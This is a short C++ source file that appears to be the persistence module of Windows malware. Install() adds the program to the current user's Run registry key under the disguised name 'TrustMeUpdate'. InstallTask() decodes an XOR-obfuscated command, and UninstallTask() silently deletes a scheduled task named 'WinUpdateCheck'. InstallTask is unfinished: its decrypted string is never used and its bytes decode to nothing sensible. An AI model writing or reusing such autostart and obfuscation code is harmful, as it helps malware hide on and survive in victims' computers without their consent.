#include "../../include/core/persistence.h"
#include "../../include/utils/crypto.h"
#include <windows.h>
#include <string>

void Install() {
    char path[MAX_PATH];
    if (GetModuleFileNameA(NULL, path, MAX_PATH) == 0) return;
    HKEY hKey;
    const char* regPath = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";

    if (RegOpenKeyExA(HKEY_CURRENT_USER, regPath, 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, "TrustMeUpdate", 0, REG_SZ, (BYTE*)path, (DWORD)(strlen(path) + 1));
        RegCloseKey(hKey);
    }
}

void InstallTask() {
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);

    std::vector<unsigned char> encCmd = {0x38, 0x28, 0x23, 0x3F, 0x2A, 0x2C, 0x20, 0x38}; // Пример
    std::string cmdBase = decrypt(encCmd, 'X'); 
}

void UninstallTask() {
    WinExec("schtasks /delete /tn \"WinUpdateCheck\" /f", SW_HIDE);
}